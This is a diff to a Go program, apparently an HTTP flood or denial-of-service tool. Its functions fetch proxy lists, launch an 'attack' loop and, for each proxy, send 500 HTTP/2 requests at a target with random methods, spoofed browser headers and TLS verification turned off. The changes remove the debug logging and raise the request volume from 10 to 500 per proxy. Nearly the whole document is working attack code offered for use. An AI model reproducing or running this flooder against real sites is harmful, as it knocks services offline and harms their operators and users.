@@ -1,5 +1,5 @@
 package main
-// w
+
 import (
     "crypto/tls"
     "flag"
@@ -137,87 +137,68 @@ func fetchProxies() {
 }
 
 func sendRequest(proxyAddr, target string) {
-    log.Printf("DEBUG: Starting sendRequest with proxy %s and target %s", proxyAddr, target)
-
     parsedURL, err := url.Parse(target)
     if err != nil {
-        log.Printf("DEBUG: Failed to parse target URL: %v", err)
         atomic.AddUint64(&errorCount, 1)
         return
     }
-    log.Printf("DEBUG: Parsed target URL: %s", parsedURL.String())
 
-    // Set up the dialer and connect to the proxy
-    dialer := &net.Dialer{Timeout: 3 * time.Second, KeepAlive: 30 * time.Second}
-    conn, err := dialer.Dial("tcp", proxyAddr)
+    // Set up proxy URL
+    proxyURL, err := url.Parse("http://" + proxyAddr)
     if err != nil {
-        log.Printf("DEBUG: Failed to dial proxy %s: %v", proxyAddr, err)
         atomic.AddUint64(&errorCount, 1)
         return
     }
-    defer conn.Close()
-    log.Printf("DEBUG: Successfully connected to proxy %s", proxyAddr)
 
-    // Perform the CONNECT request to establish the tunnel
-    fmt.Fprintf(conn, "CONNECT %s:443 HTTP/1.1\r\nHost: %s\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n", parsedURL.Host, parsedURL.Host)
-    buf := make([]byte, 4096)
-    n, err := conn.Read(buf)
-    if err != nil || !strings.Contains(string(buf[:n]), "200") {
-        log.Printf("DEBUG: CONNECT request failed: err=%v, response=%s", err, string(buf[:n]))
-        atomic.AddUint64(&errorCount, 1)
-        return
-    }
-    log.Printf("DEBUG: CONNECT request successful, response: %s", string(buf[:n]))
-
-    // Wrap the connection with TLS for HTTP/2
-    tlsConn := tls.Client(conn, createTLSConfig())
-    defer tlsConn.Close()
-    log.Printf("DEBUG: TLS connection established")
-
-    // Set up HTTP/2 transport using the existing TLS connection
-    transport := &http2.Transport{
-        DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
-            log.Printf("DEBUG: DialTLS called with network=%s, addr=%s", network, addr)
-            return tlsConn, nil
+    // Configure HTTP client with proxy and TLS settings
+    transport := &http.Transport{
+        Proxy: http.ProxyURL(proxyURL),
+        TLSClientConfig: &tls.Config{
+            InsecureSkipVerify: true,
+            MinVersion:         tls.VersionTLS13,
+            MaxVersion:         tls.VersionTLS13,
+            CipherSuites:       []uint16{tls.TLS_AES_128_GCM_SHA256, tls.TLS_AES_256_GCM_SHA384},
+            NextProtos:         []string{"h2"},
+            CurvePreferences:   []tls.CurveID{tls.X25519},
         },
-        TLSClientConfig: createTLSConfig(),
+        DialContext: (&net.Dialer{
+            Timeout:   3 * time.Second,
+            KeepAlive: 30 * time.Second,
+        }).DialContext,
     }
-    log.Printf("DEBUG: HTTP/2 transport configured")
+
+    if err := http2.ConfigureTransport(transport); err != nil {
+        atomic.AddUint64(&errorCount, 1)
+        return
+    }
 
     client := &http.Client{
         Transport: transport,
-        Timeout:   500 * time.Millisecond,
+        Timeout:   2 * time.Second,
     }
     defer client.CloseIdleConnections()
-    log.Printf("DEBUG: HTTP client created")
 
-    // Use a single connection to multiplex requests
     var wg sync.WaitGroup
-    reqChan := make(chan *http.Request, 10) // Buffered channel for requests
+    reqChan := make(chan *http.Request, 500)
     doneChan := make(chan struct{})
 
-    // Worker to process requests from the channel
+    // Worker to process requests
     go func() {
-        log.Printf("DEBUG: Starting request worker goroutine")
         for req := range reqChan {
-            log.Printf("DEBUG: Sending request: %s %s", req.Method, req.URL.String())
             resp, err := client.Do(req)
             if err != nil {
-                log.Printf("DEBUG: Request failed: %v", err)
                 atomic.AddUint64(&errorCount, 1)
             } else {
-                log.Printf("DEBUG: Request succeeded, status: %s", resp.Status)
+                atomic.AddUint64(&requestCount, 1)
                 resp.Body.Close()
             }
-            atomic.AddUint64(&requestCount, 1)
             wg.Done()
         }
-        log.Printf("DEBUG: Request worker goroutine finished")
         close(doneChan)
     }()
 
-    // Generate and send 500 requests using multiplexing
-    for i := 0; i < 10; i++ {
+    // Generate and send 500 requests
+    for i := 0; i < 500; i++ {
         wg.Add(1)
         headers := map[string]string{
             "sec-purpose":               "prefetch;prerender",
@@ -234,9 +215,8 @@ func sendRequest(proxyAddr, target string) {
         }
 
         method := randomMethod()
-        req, err := http.NewRequest(method, target, nil) // Use target directly, no random path
+        req, err := http.NewRequest(method, target, nil)
         if err != nil {
-            log.Printf("DEBUG: Failed to create request %d: %v", i, err)
             atomic.AddUint64(&errorCount, 1)
             wg.Done()
             continue
@@ -244,15 +224,12 @@ func sendRequest(proxyAddr, target string) {
         for k, v := range headers {
             req.Header.Set(k, v)
         }
-        log.Printf("DEBUG: Queuing request %d: %s %s", i, method, target)
-        reqChan <- req // Send request to the channel
+        reqChan <- req
     }
 
-    log.Printf("DEBUG: All requests queued, waiting for completion")
     wg.Wait()
-    close(reqChan) // Close the request channel
-    <-doneChan     // Wait for the worker to finish
-    log.Printf("DEBUG: sendRequest completed")
+    close(reqChan)
+    <-doneChan
 }
 
 func attack(wg *sync.WaitGroup, stopChan chan struct{}) {
